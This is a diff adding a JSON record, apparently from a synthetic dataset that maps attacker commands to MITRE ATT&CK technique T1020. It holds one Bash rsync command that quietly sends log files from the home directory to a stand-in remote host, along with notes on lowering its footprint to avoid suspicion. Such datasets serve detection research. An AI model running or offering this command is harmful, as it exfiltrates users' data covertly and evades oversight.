@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1020",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "ionice -c3 nice -n 19 rsync -azq --append-verify --update --include='*/' --include='*.log' --exclude='*' $HOME/.local/share/ backup@cdn.example.net:.cache/.lg/$HOSTNAME/",
+  "explanation": "Low-I/O, low-CPU rsync of only log files with append-verify to efficiently send new log data without re-transferring full files, consistent with automated exfiltration (T1020).",
+  "rationale_steps": [
+    "Lower resource footprint with ionice/nice to avoid suspicion.",
+    "Select only .log files using filter rules.",
+    "Use --append-verify and --update for incremental deltas.",
+    "Quiet mode hides operational output."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1020-d10cd1e2-2cd5e12a",
+  "source_prompt_hash": "d10cd1e2",
+  "timestamp_utc": "2025-09-30T09:04:44.050324Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
